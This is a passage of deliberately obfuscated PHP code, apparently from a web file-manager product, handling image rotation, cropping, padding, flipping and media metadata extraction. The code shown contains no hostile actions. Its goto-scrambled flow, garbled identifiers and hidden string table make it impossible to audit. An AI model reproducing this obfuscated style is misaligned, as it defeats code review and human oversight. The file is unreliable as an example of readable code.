$DôÓ„ÎÍÚ) { $cÍâåÁ„ÖÁ = $this->creatImage($this->im, $b‰ŞÒñ–˜, $e°Å·ç‘óé, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $cÍâåÁ„ÖÁ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $cÍâåÁ„ÖÁ = $this->autoRotate($cÍâåÁ„ÖÁ); return $this->echoImage($cÍâåÁ„ÖÁ, $e×ÚÃ¶éß°); } private function autoRotate($CïŠç×òíĞ) { goto fÙ¢òµ‡ŞÅ; DØ¢ğ‰êÎ¦: if ($B¯ô¯¸ÎÅŠ[$C¬²˜²º‘Í[1871]] == 8) { $bˆ“ß¼¶¼ = 270; } if ($B¯ô¯¸ÎÅŠ[$C¬²˜²º‘Í[1871]] == 3) { $bˆ“ß¼¶¼ = 180; } return $this->rotateDegree($CïŠç×òíĞ, $bˆ“ß¼¶¼); goto D¦Ú¿È²Õä; fÙ¢òµ‡ŞÅ: $C¬²˜²º‘Í =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$CïŠç×òíĞ || !function_exists($C¬²˜²º‘Í[1870])) { return $CïŠç×òíĞ; } $B¯ô¯¸ÎÅŠ = exif_read_data($this->srcFile); goto DÍèÙÚï®¤; DÍèÙÚï®¤: if (!$B¯ô¯¸ÎÅŠ || !isset($B¯ô¯¸ÎÅŠ[$C¬²˜²º‘Í[1871]]) || $B¯ô¯¸ÎÅŠ[$C¬²˜²º‘Í[1871]] == 1) { return $CïŠç×òíĞ; } $bˆ“ß¼¶¼ = 0; if ($B¯ô¯¸ÎÅŠ[$C¬²˜²º‘Í[1871]] == 6) { $bˆ“ß¼¶¼ = 90; } goto DØ¢ğ‰êÎ¦; D¦Ú¿È²Õä: } private function rotateDegree($E£†ŞÔôåê, $C®¿œØœ´ ) { if (!$E£†ŞÔôåê || $C®¿œØœ´  % 360 === 0 || !function_exists($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1872])) { return $E£†ŞÔôåê; } $f®¥ŸÚîˆ = imageRotate($E£†ŞÔôåê, 360 - $C®¿œØœ´ , 0); imageDestroy($E£†ŞÔôåê); return $f®¥ŸÚîˆ ? $f®¥ŸÚîˆ : $E£†ŞÔôåê; } function cut($f‹ƒ……Ò™Ì, $cÕ±šêìÁ, $DŒ˜¿¾¯²¨) { goto AÌÊ¬á¹¡Ó; c¯˜ôÇ¡°º: return $this->echoImage($Aìã”¤ÄÕ, $f‹ƒ……Ò™Ì); goto d–°«øäœ÷; EĞçµª«ÜŒ: $a”ƒÇùŒø· = $this->creatImage($this->im, $D¾ò‚Öà¬‡, $fÜ­õ¹ÄãÂ, 0, 0, 0, 0, $this->srcW, $this->srcH); $Aìã”¤ÄÕ = $this->creatImage($a”ƒÇùŒø·, $cÕ±šêìÁ, $DŒ˜¿¾¯²¨, 0, 0, ($D¾ò‚Öà¬‡ - $cÕ±šêìÁ) / 2, ($fÜ­õ¹ÄãÂ - $DŒ˜¿¾¯²¨) / 2, $cÕ±šêìÁ, $DŒ˜¿¾¯²¨); imageDestroy($a”ƒÇùŒø·); goto c¯˜ôÇ¡°º; AÌÊ¬á¹¡Ó: $EÓ‘¿ŠçÛÉ = $cÕ±šêìÁ / $DŒ˜¿¾¯²¨; $f‰¬ÂÓ±ˆ = $this->srcW / $this->srcH; if ($EÓ‘¿ŠçÛÉ <= $f‰¬ÂÓ±ˆ) { $fÜ­õ¹ÄãÂ = $DŒ˜¿¾¯²¨; $D¾ò‚Öà¬‡ = $fÜ­õ¹ÄãÂ * ($this->srcW / $this->srcH); } else { $D¾ò‚Öà¬‡ = $cÕ±šêìÁ; $fÜ­õ¹ÄãÂ = $D¾ò‚Öà¬‡ * ($this->srcH / $this->srcW); } goto EĞçµª«ÜŒ; d–°«øäœ÷: } function backFill($bÕÎÓÇßß, $BÛÒÔ³‹‹Ÿ, $F±ŠÙ›¡, $DµêïÚŞˆé = false, $dµÆŠ”„ô§ = 255, $eÈÆ°Í¥£Œ = 255, $AÍí Úë© = 255) { goto eÔ‚‚¶äôÔ; eÔ‚‚¶äôÔ: $E·ÒË¬ß÷ = $BÛÒÔ³‹‹Ÿ / $F±ŠÙ›¡; $b»ÖİÏòÚî = $this->srcW / $this->srcH; if ($E·ÒË¬ß÷ <= $b»ÖİÏòÚî) { $cÑ±‘ÛÂÉ… = $BÛÒÔ³‹‹Ÿ; $F“ö‹£Ù = $cÑ±‘ÛÂÉ… * ($this->srcH / $this->srcW); } else { $F“ö‹£Ù = $F±ŠÙ›¡; $cÑ±‘ÛÂÉ… = $F“ö‹£Ù * ($this->srcW / $this->srcH); } goto a¶›ò‹‘¨; C¤„áßÁÊ: if ($DµêïÚŞˆé) { $e±‹ù«ÕË = imageColorTransparent($E´÷¾¤ó½Í, $e±‹ù«ÕË); $Cƒ—šÛ„„ = $F±ŠÙ›¡ - $F“ö‹£Ù; } imageFilledRectangle($E´÷¾¤ó½Í, 0, 0, $BÛÒÔ³‹‹Ÿ, $F±ŠÙ›¡, $e±‹ù«ÕË); if ($this->srcW > $BÛÒÔ³‹‹Ÿ || $this->srcH > $F±ŠÙ›¡) { $f½‰Ó±µ = $this->creatImage($this->im, $cÑ±‘ÛÂÉ…, $F“ö‹£Ù, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($cÑ±‘ÛÂÉ… < $BÛÒÔ³‹‹Ÿ) { imageCopy($E´÷¾¤ó½Í, $f½‰Ó±µ, ($BÛÒÔ³‹‹Ÿ - $cÑ±‘ÛÂÉ…) / 2, 0, 0, 0, $cÑ±‘ÛÂÉ…, $F“ö‹£Ù); } else { if ($F“ö‹£Ù < $F±ŠÙ›¡) { imageCopy($E´÷¾¤ó½Í, $f½‰Ó±µ, 0, $Cƒ—šÛ„„, 0, 0, $cÑ±‘ÛÂÉ…, $F“ö‹£Ù); } else { imageCopy($E´÷¾¤ó½Í, $f½‰Ó±µ, 0, 0, 0, 0, $cÑ±‘ÛÂÉ…, $F“ö‹£Ù); } } } else { imageCopyMerge($E´÷¾¤ó½Í, $this->im, ($BÛÒÔ³‹‹Ÿ - $cÑ±‘ÛÂÉ…) / 2, $Cƒ—šÛ„„, 0, 0, $cÑ±‘ÛÂÉ…, $F“ö‹£Ù, 100); } goto D’à‹‡ˆœä; a¶›ò‹‘¨: if (function_exists($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1873])) { @($E´÷¾¤ó½Í = imageCreateTrueColor($BÛÒÔ³‹‹Ÿ, $F±ŠÙ›¡)); if (!$E´÷¾¤ó½Í) { $E´÷¾¤ó½Í = imageCreate($BÛÒÔ³‹‹Ÿ, $F±ŠÙ›¡); } } else { $E´÷¾¤ó½Í = imageCreate($BÛÒÔ³‹‹Ÿ, $F±ŠÙ›¡); } $Cƒ—šÛ„„ = ($F±ŠÙ›¡ - $F“ö‹£Ù) / 2; $e±‹ù«ÕË = imagecolorallocate($E´÷¾¤ó½Í, $dµÆŠ”„ô§, $eÈÆ°Í¥£Œ, $AÍí Úë©); goto C¤„áßÁÊ; D’à‹‡ˆœä: return $this->echoImage($E´÷¾¤ó½Í, $bÕÎÓÇßß); goto aÕ˜±šÌŞ’; aÕ˜±šÌŞ’: } function creatImage($AÆñÑ•À†, $AÏ–†…ô£, $dØ¶ö¹ø÷½, $e áÃÉ¡®ç, $Aé›ŒŒì¼š, $bòµ¯ÅÔª’, $CÌ²¾Ö¯‘Œ, $D†øŞ†…Î, $EÕåîäõÏ¿) { if (function_exists($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1873])) { @($Aµ¬ÀÉ±´ = ImageCreateTrueColor($AÏ–†…ô£, $dØ¶ö¹ø÷½)); @imagealphablending($Aµ¬ÀÉ±´, !1); @imagesavealpha($Aµ¬ÀÉ±´, !0); if ($Aµ¬ÀÉ±´) { imageCopyResampled($Aµ¬ÀÉ±´, $AÆñÑ•À†, $e áÃÉ¡®ç, $Aé›ŒŒì¼š, $bòµ¯ÅÔª’, $CÌ²¾Ö¯‘Œ, $AÏ–†…ô£, $dØ¶ö¹ø÷½, $D†øŞ†…Î, $EÕåîäõÏ¿); } else { $Aµ¬ÀÉ±´ = ImageCreate($AÏ–†…ô£, $dØ¶ö¹ø÷½); imageCopyResized($Aµ¬ÀÉ±´, $AÆñÑ•À†, $e áÃÉ¡®ç, $Aé›ŒŒì¼š, $bòµ¯ÅÔª’, $CÌ²¾Ö¯‘Œ, $AÏ–†…ô£, $dØ¶ö¹ø÷½, $D†øŞ†…Î, $EÕåîäõÏ¿); } } else { $Aµ¬ÀÉ±´ = ImageCreate($AÏ–†…ô£, $dØ¶ö¹ø÷½); imageCopyResized($Aµ¬ÀÉ±´, $AÆñÑ•À†, $e áÃÉ¡®ç, $Aé›ŒŒì¼š, $bòµ¯ÅÔª’, $CÌ²¾Ö¯‘Œ, $AÏ–†…ô£, $dØ¶ö¹ø÷½, $D†øŞ†…Î, $EÕåîäõÏ¿); } return $Aµ¬ÀÉ±´; } public function imgRotate($a»À­œ£àö, $d„ßÃÂßô§) { goto C°„­¶›³¿; c³æä¯ˆğë: return $aåàÙ¸õ‘; goto F¯æïÉ›ƒ; dàÕŞŸ¡à“: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $aåàÙ¸õ‘ = imagegif($e¶»†Ÿ¬ñ³, $a»À­œ£àö); break; case IMAGETYPE_JPEG: $aåàÙ¸õ‘ = imagejpeg($e¶»†Ÿ¬ñ³, $a»À­œ£àö, 100); break; case IMAGETYPE_PNG: $aåàÙ¸õ‘ = imagePNG($e¶»†Ÿ¬ñ³, $a»À­œ£àö); break; default: break; } imageDestroy($e¶»†Ÿ¬ñ³); imageDestroy($this->im); goto c³æä¯ˆğë; C°„­¶›³¿: if (!$this->im || $d„ßÃÂßô§ % 360 === 0 || !function_exists($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1872])) { return !1; } $e¶»†Ÿ¬ñ³ = imageRotate($this->im, 360 - $d„ßÃÂßô§, 0); $aåàÙ¸õ‘ = !1; goto dàÕŞŸ¡à“; F¯æïÉ›ƒ: } function echoImage($c£ìÖø©Õ, $aÑ¯Ò ‰Ç) { goto A×¶®”Õ£; E™Íš¨¶¦: imageDestroy($this->im); return $fª¾Õ×ˆµÓ; goto CÖ¡ÊËÇ‘Ë; c˜èÒµ¡Š¹: $fª¾Õ×ˆµÓ = !1; switch ($this->echoType) { case $eí“ôÒœÛ[1874]: $fª¾Õ×ˆµÓ = imagePNG($c£ìÖø©Õ); break; case $eí“ôÒœÛ[167]: $fª¾Õ×ˆµÓ = imagePNG($c£ìÖø©Õ, $aÑ¯Ò ‰Ç); break; } imageDestroy($c£ìÖø©Õ); goto E™Íš¨¶¦; A×¶®”Õ£: $eí“ôÒœÛ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$c£ìÖø©Õ) { return !1; } ob_get_clean(); goto c˜èÒµ¡Š¹; CÖ¡ÊËÇ‘Ë: } } if (!function_exists($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1875])) { define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1876], 0); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1877], 1); define($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1878], 2); function imageflip($Cî£Ç©²¸¦, $D§±‡ÓèÔ) { switch ($D§±‡ÓèÔ) { case IMG_FLIP_HORIZONTAL: $B‚¯ÉÌê = imagesx($Cî£Ç©²¸¦) - 1; $fˆ–ö¹ÂÅ = $B‚¯ÉÌê / 2; $d¼†£ù†„‹ = imagesy($Cî£Ç©²¸¦); $bÄ‡ä›³¾« = imageistruecolor($Cî£Ç©²¸¦) ? imagecreatetruecolor(1, $d¼†£ù†„‹) : imagecreate(1, $d¼†£ù†„‹); for ($CÆÇÉ”ƒè = 0; $CÆÇÉ”ƒè < $fˆ–ö¹ÂÅ; ++$CÆÇÉ”ƒè) { imagecopy($bÄ‡ä›³¾«, $Cî£Ç©²¸¦, 0, 0, $CÆÇÉ”ƒè, 0, 1, $d¼†£ù†„‹); imagecopy($Cî£Ç©²¸¦, $Cî£Ç©²¸¦, $CÆÇÉ”ƒè, 0, $B‚¯ÉÌê - $CÆÇÉ”ƒè, 0, 1, $d¼†£ù†„‹); imagecopy($Cî£Ç©²¸¦, $bÄ‡ä›³¾«, $B‚¯ÉÌê - $CÆÇÉ”ƒè, 0, 0, 0, 1, $d¼†£ù†„‹); } break; case IMG_FLIP_VERTICAL: $fšùºªâæß = imagesx($Cî£Ç©²¸¦); $Aí¶ïàÔ¿‡ = imagesy($Cî£Ç©²¸¦) - 1; $cØãà´œ‘Í = $Aí¶ïàÔ¿‡ / 2; $bÄ‡ä›³¾« = imageistruecolor($Cî£Ç©²¸¦) ? imagecreatetruecolor($fšùºªâæß, 1) : imagecreate($fšùºªâæß, 1); for ($BÏÅƒ³×¬È = 0; $BÏÅƒ³×¬È < $cØãà´œ‘Í; ++$BÏÅƒ³×¬È) { imagecopy($bÄ‡ä›³¾«, $Cî£Ç©²¸¦, 0, 0, 0, $BÏÅƒ³×¬È, $fšùºªâæß, 1); imagecopy($Cî£Ç©²¸¦, $Cî£Ç©²¸¦, 0, $BÏÅƒ³×¬È, 0, $Aí¶ïàÔ¿‡ - $BÏÅƒ³×¬È, $fšùºªâæß, 1); imagecopy($Cî£Ç©²¸¦, $bÄ‡ä›³¾«, 0, $Aí¶ïàÔ¿‡ - $BÏÅƒ³×¬È, 0, 0, $fšùºªâæß, 1); } break; case IMG_FLIP_BOTH: $fšùºªâæß = imagesx($Cî£Ç©²¸¦); $d¼†£ù†„‹ = imagesy($Cî£Ç©²¸¦); $bÄ‡ä›³¾« = imagerotate($Cî£Ç©²¸¦, 180, 0); imagecopy($Cî£Ç©²¸¦, $bÄ‡ä›³¾«, 0, 0, 0, 0, $fšùºªâæß, $d¼†£ù†„‹); break; default: return; } imagedestroy($bÄ‡ä›³¾«); } } if (!function_exists($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1879])) { function imagecreatefrombmp($D²‚É«Ôä) { return ImageGdBMP::load($D²‚É«Ôä); } } goto cæÇÀ„õŒ®; D÷â®§–ƒë: class GetInfo { private static $fileTypeArray; public static function get($aæÚ‘ŒÕø÷) { $B°Í¥‚¯Ô = IO::info($aæÚ‘ŒÕø÷); return self::infoAdd($B°Í¥‚¯Ô); } public static function check() { } public static function infoAdd(&$dÂÜ¥šİœŞ) { goto e¡‘æ¬ç; BËã¸…¤“: return $dÂÜ¥šİœŞ; goto b¡Ë¬š‘Òœ; e¡‘æ¬ç: $F«Ó÷öƒŒ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $dê£Œ­ùøŸ; if (!$dê£Œ­ùøŸ) { require SDK_DIR . $F«Ó÷öƒŒ[1612]; $dê£Œ­ùøŸ = new getID3(); } goto a‘Ù‹¡½ÃÄ; a‘Ù‹¡½ÃÄ: if (!$dÂÜ¥šİœŞ || $dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[29]] != $F«Ó÷öƒŒ[167]) { return; } if (!self::support($dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[160]]) || isset($dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[426]])) { return; } $F°ÈÄ¿— = $F«Ó÷öƒŒ[1613] . $dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[75]]; goto FŞÌèàò«Ò; FŞÌèàò«Ò: $BõÔ÷ì›Š = $dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[160]]; try { if ($dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[160]] == $F«Ó÷öƒŒ[1614]) { $C¥ÍŒâ™•¶ = self::psdParse($F°ÈÄ¿—); $BõÔ÷ì›Š = $F«Ó÷öƒŒ[1615]; } else { if ($dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[160]] == $F«Ó÷öƒŒ[1616]) { $C¥ÍŒâ™•¶ = self::pdfParse($F°ÈÄ¿—); } else { $BõÔ÷ì›Š = self::$fileTypeArray[$F«Ó÷öƒŒ[1617]][$dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[160]]]; $cÅ¹îÚ¹ = self::$fileTypeArray[$F«Ó÷öƒŒ[1618]][$BõÔ÷ì›Š][$F«Ó÷öƒŒ[1619]]; $DŒÖÑôå±Ñ = @$dê£Œ­ùøŸ->analyze($F°ÈÄ¿—, $dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[77]], $dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[28]]); $C¥ÍŒâ™•¶ = self::parseData($DŒÖÑôå±Ñ, $cÅ¹îÚ¹, $dÂÜ¥šİœŞ); } } } catch (Exception $EÊŒ•å¬ö) { $C¥ÍŒâ™•¶ = array($F«Ó÷öƒŒ[372] => $BõÔ÷ì›Š); } if (!$C¥ÍŒâ™•¶) { return; } goto A›Ş¿Ù‰À; A›Ş¿Ù‰À: $C¥ÍŒâ™•¶ = self::arrayValueLimit($C¥ÍŒâ™•¶); $C¥ÍŒâ™•¶[$F«Ó÷öƒŒ[372]] = $BõÔ÷ì›Š; $dÂÜ¥šİœŞ[$F«Ó÷öƒŒ[426]] = $C¥ÍŒâ™•¶; goto BËã¸…¤“; b¡Ë¬š‘Òœ: } public static function support($B™áì¨İÌÑ) { goto A«¿‚í‡Ó; aìãùÃÈ†­: return !1; goto C¤Î‹È‹ª; A«¿‚í‡Ó: $dŒèŠ²à¸Ô =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $B™áì¨İÌÑ = strtolower($B™áì¨İÌÑ); goto d…ß‰İŠ°—; d…ß‰İŠ°—: $BÂÓ¹¶’‹ = array($dŒèŠ²à¸Ô[1616], $dŒèŠ²à¸Ô[1614]); if (in_array($B™áì¨İÌÑ, $BÂÓ¹¶’‹)) { return !0; } if (isset(self::$fileTypeArray[$dŒèŠ²à¸Ô[1617]][$B™áì¨İÌÑ])) { return !0; } goto aìãùÃÈ†­; C¤Î‹È‹ª: } public static function arrayValueLimit($B¦ºğµ¶Ñè, $c›¼¯Ç¡î× = 5000) { if (!is_array($B¦ºğµ¶Ñè)) { return $B¦ºğµ¶Ñè; } foreach ($B¦ºğµ¶Ñè as $B«ñÃ¼‹ßİ => $Eïå™Ë¿³…) { if (is_string($Eïå™Ë¿³…) && strlen($Eïå™Ë¿³…) > $c›¼¯Ç¡î×) { $B¦ºğµ¶Ñè[$B«ñÃ¼‹ßİ] = substr($Eïå™Ë¿³…, 0, $c›¼¯Ç¡î×); } else { if (is_array($Eïå™Ë¿³…)) { $B¦ºğµ¶Ñè[$B«ñÃ¼‹ßİ] = self::arrayValueLimit($Eïå™Ë¿³…, $c›¼¯Ç¡î×); } } } return $B¦ºğµ¶Ñè; } private static function parseData($d‘¸’‚’, $eò–¾ç‚Õ, $déŸØó¶Ù‘) { $A¸ºŒ‡îò =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $cì‹šĞÚİğ = $d‘¸’‚’[$A¸ºŒ‡îò[1620]]; $d÷Ãã—¹æÅ = array(); foreach ($eò–¾ç‚Õ as $aßï½«ª†„ => $EŞØŞÆİáó) { foreach ($EŞØŞÆİáó as $bë¦ÅÃÒ§„) { if (is_array($bë¦ÅÃÒ§„)) { $eÇ’Ó±‰ô© = self::parseData($d‘¸’‚’, $EŞØŞÆİáó, $déŸØó¶Ù‘); if ($eÇ’Ó±‰ô©) { $d÷Ãã—¹æÅ[$aßï½«ª†„] = $eÇ’Ó±‰ô©; } break; } $C–ø‡í‹·¿ = str_replace($A¸ºŒ‡îò[1390], $cì‹šĞÚİğ, $bë¦ÅÃÒ§„); $eÇ’Ó±‰ô© = _get($d‘¸’‚’, $C–ø‡í‹·¿); $eÇ’Ó±‰ô© = is_array($eÇ’Ó±‰ô©) ? $eÇ’Ó±‰ô©[0] : $eÇ’Ó±‰ô©; if ($eÇ’Ó±‰ô©) { break; } } if ($eÇ’Ó±‰ô© || $eÇ’Ó±‰ô© === 0 || $eÇ’Ó±‰ô© === !1) { $eÇ’Ó±‰ô© = self::valueReset($bë¦ÅÃÒ§„, $eÇ’Ó±‰ô©, $aßï½«ª†„); if ($eÇ’Ó±‰ô© !== null) { $d÷Ãã—¹æÅ[$aßï½«ª†„] = $eÇ’Ó±‰ô©; } } } $d÷Ãã—¹æÅ = self::valueResetAll($d÷Ãã—¹æÅ, $déŸØó¶Ù‘); return $d÷Ãã—¹æÅ; } private static function psdParse($BÄØ¥ÍÕ©ä) { $DÛ½‚ëó¹‘ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (IO::fileSubstr($BÄØ¥ÍÕ©ä, 0, 4) != $DÛ½‚ëó¹‘[1621]) { return !1; } $b‰µì×ÁÛ = getImageSize($BÄØ¥ÍÕ©ä, $F°¡»ßÁº); if (!$b‰µì×ÁÛ) { return; } $DÔŒ‡ñé³Ï = array($DÛ½‚ëó¹‘[1536] => $b‰µì×ÁÛ[0], $DÛ½‚ëó¹‘[1538] => $b‰µì×ÁÛ[1]); return $DÔŒ‡ñé³Ï; } private static function pdfParse($eÚÎÕÍ¥³Û) { return FileParsePdf::parse($eÚÎÕÍ¥³Û); } private static function fileTypeParse() { $bÍ‡ñëˆœ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C—Ô»œŸâ™ = self::fileTypeArray(); $BŠƒ‹ğÚçò = array(); foreach ($C—Ô»œŸâ™ as $béÛëäÆáò => $DğÅÎ²Ì”Ñ) { $CøÛˆŸ£Û¢ = _get($DğÅÎ²Ì”Ñ, $bÍ‡ñëˆœ[160], $bÍ‡ñëˆœ[33]); $DÅÃèÂ‹‚Ş = is_string($CøÛˆŸ£Û¢) ? explode($bÍ‡ñëˆœ[47], $CøÛˆŸ£Û¢) : $CøÛˆŸ£Û¢; if (!$DÅÃèÂ‹‚Ş) { continue; } foreach ($DÅÃèÂ‹‚Ş as $CøÛˆŸ£Û¢) { $CøÛˆŸ£Û¢ = strtolower(trim($CøÛˆŸ£Û¢)); if (!$CøÛˆŸ£Û¢) { continue; } $BŠƒ‹ğÚçò[$CøÛˆŸ£Û¢] = $béÛëäÆáò; } $C—Ô»œŸâ™[$béÛëäÆáò][$bÍ‡ñëˆœ[160]] = array_keys($BŠƒ‹ğÚçò); $C—Ô»œŸâ™[$béÛëäÆáò][$bÍ‡ñëˆœ[1619]] = self::parseKeyMap($DğÅÎ²Ì”Ñ[$bÍ‡ñëˆœ[1619]]); } return array($bÍ‡ñëˆœ[1618] => $C—Ô»œŸâ™, $bÍ‡ñëˆœ[1617] => $BŠƒ‹ğÚçò); } private static function parseKeyMap($a²±÷‡‡’ã) { $EÃ¯ÎŒ³ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; foreach ($a²±÷‡‡’ã as $E¯Æ¶Ğ£Èò => $E¦ˆ§‡ğø) { if (is_array($E¦ˆ§‡ğø)) { $eŸ—¤‚ö” = self::parseKeyMap($E¦ˆ§‡ğø); if ($eŸ—¤‚ö”) { $a²±÷‡‡’ã[$E¯Æ¶Ğ£Èò] = $eŸ—¤‚ö”; } continue; } $cÃ©š†ÊğÑ = explode($EÃ¯ÎŒ³[47], $E¦ˆ§‡ğø); $AÎ¯®â÷¸õ = array(); foreach ($cÃ©š†ÊğÑ as $eŸ¶‚ïèŒ‘) { $eŸ¶‚ïèŒ‘ = trim($eŸ¶‚ïèŒ‘); if (!$eŸ¶‚ïèŒ‘) { continue; } if (preg_match($EÃ¯ÎŒ³[1622], $eŸ¶‚ïèŒ‘, $cÇ¢¡—œ±÷)) { $aÊ›¥ÜáÇ = explode($EÃ¯ÎŒ³[271], $cÇ¢¡—œ±÷[1]); foreach ($aÊ›¥ÜáÇ as $aóô«—“¿¢) { $AÎ¯®â÷¸õ[] = str_replace($cÇ¢¡—œ±÷[0], $aóô«—“¿¢, $eŸ¶‚ïèŒ‘); } } else { $AÎ¯®â÷¸õ[] = $eŸ¶‚ïèŒ‘; } } $a²±÷‡‡’ã[$E¯Æ¶Ğ£Èò] = $AÎ¯®â÷¸õ; } return $a²±÷‡‡’ã; } private static function valueResetAll($fƒ‚œŠ¾†¯, $AËª¨²®²ñ) { goto F¤˜±Ñ¦„Ë; C«˜÷Œš„ì: $Dö”Ü‰ìÁ = _get($fƒ‚œŠ¾†¯, $côÕ¨Íİ¤²[1635], $côÕ¨Íİ¤²[33]); $cñ…„Ü¼ïñ = $eÉÔ˜šöÙÉ . $béøŸ˜âè . $Dö”Ü‰ìÁ; if ($cñ…„Ü¼ïñ && get_charset($cñ…„Ü¼ïñ) != $côÕ¨Íİ¤²[326]) { $fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1632]][$côÕ¨Íİ¤²[1343]] = iconv_to($fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1632]][$côÕ¨Íİ¤²[1343]], get_charset($cñ…„Ü¼ïñ), $côÕ¨Íİ¤²[326]); $fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1632]][$côÕ¨Íİ¤²[1636]] = iconv_to($fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1632]][$côÕ¨Íİ¤²[1636]], get_charset($cñ…„Ü¼ïñ), $côÕ¨Íİ¤²[326]); $fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1632]][$côÕ¨Íİ¤²[1637]] = iconv_to($fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1632]][$côÕ¨Íİ¤²[1637]], get_charset($cñ…„Ü¼ïñ), $côÕ¨Íİ¤²[326]); } goto C–É½Óô×‚; F¤˜±Ñ¦„Ë: $côÕ¨Íİ¤² =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (isset($fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1623]])) { $bß¹ê¨°ì = ceil($fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1623]]); $e÷‹Ã¨æ¡ = intval($bß¹ê¨°ì / 3600); $d£¦õ ‡‚§ = intval(($bß¹ê¨°ì - $e÷‹Ã¨æ¡ * 3600) / 60); $b†¦­·ì’‘ = $bß¹ê¨°ì % 60; $fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1624]] = sprintf($côÕ¨Íİ¤²[1625], $e÷‹Ã¨æ¡, $d£¦õ ‡‚§, $b†¦­·ì’‘); if ($e÷‹Ã¨æ¡ == 0) { $fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1624]] = sprintf($côÕ¨Íİ¤²[1626], $d£¦õ ‡‚§, $b†¦­·ì’‘); } } $FÆåº¥ÁË = _get($fƒ‚œŠ¾†¯, $côÕ¨Íİ¤²[1627]); goto aï”¯âÅ­¸; C–É½Óô×‚: return $fƒ‚œŠ¾†¯; goto AªÏÈÇ‡ˆ§; aï”¯âÅ­¸: if ($FÆåº¥ÁË) { $eÀö´×¾ìë = IO_PATH_SYSTEM_TEMP . $côÕ¨Íİ¤²[1628] . KodIO::hashPath($AËª¨²®²ñ) . $côÕ¨Íİ¤²[1629]; $fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1630]] = Action($côÕ¨Íİ¤²[1631])->pluginCacheFileSet($eÀö´×¾ìë, $FÆåº¥ÁË); unset($fƒ‚œŠ¾†¯[$côÕ¨Íİ¤²[1632]][$côÕ¨Íİ¤²[1615]]); } $eÉÔ˜šöÙÉ = _get($fƒ‚œŠ¾†¯, $côÕ¨Íİ¤²[1633], $côÕ¨Íİ¤²[33]); $béøŸ˜âè = _get($fƒ‚œŠ¾†¯, $côÕ¨Íİ¤²[1634], $côÕ¨Íİ¤²[33]); goto C«˜÷Œš„ì; AªÏÈÇ‡ˆ§: } private static function valueReset($f‘‹ˆÕàÆ , $bß”ˆÅ“£Ù, $fİ‰¸Ë’ƒÂ) { $BªŠ×ËÈ‡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F¼«Ñ£ÔÕò = $BªŠ×ËÈ‡[1553]; switch ($f‘‹ˆÕàÆ ) { case $BªŠ×ËÈ‡[1638]: $bß”ˆÅ“£Ù = $bß”ˆÅ“£Ù == $BªŠ×ËÈ‡[83] ? $BªŠ×ËÈ‡[1639] : $BªŠ×ËÈ‡[1640]; break; case $BªŠ×ËÈ‡[1641]: $bß”ˆÅ“£Ù = $bß”ˆÅ“£Ù ? $bß”ˆÅ“£Ù : null; break; default: break; } switch ($fİ‰¸Ë’ƒÂ) { case $BªŠ×ËÈ‡[1642]: $bß”ˆÅ“£Ù = round($bß”ˆÅ“£Ù, 2); break; case $BªŠ×ËÈ‡[187]: case $BªŠ×ËÈ‡[107]: if ($bß”ˆÅ“£Ù < 0) { $bß”ˆÅ“£Ù = null; } else { if (is_numeric($bß”ˆÅ“£Ù)) { $bß”ˆÅ“£Ù = date($F¼«Ñ£ÔÕò, $bß”ˆÅ“£Ù); } } break; default: break; } return $bß”ˆÅ“£Ù; } private static function fileTypeArray() { $e‚ÚÁÕìŸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; return array($e‚ÚÁÕìŸ[1615] => array($e‚ÚÁÕìŸ[160] => $e‚ÚÁÕìŸ[1643] . $e‚ÚÁÕìŸ[1644], $e‚ÚÁÕìŸ[1619] => array($e‚ÚÁÕìŸ[1536] => $e‚ÚÁÕìŸ[1645], $e‚ÚÁÕìŸ[1538] => $e‚ÚÁÕìŸ[1646], $e‚ÚÁÕìŸ[1647] => $e‚ÚÁÕìŸ[1648], $e‚ÚÁÕìŸ[1649] => $e‚ÚÁÕìŸ[1650], $e‚ÚÁÕìŸ[187] => $e‚ÚÁÕìŸ[1651], $e‚ÚÁÕìŸ[107] => $e‚ÚÁÕìŸ[1652], 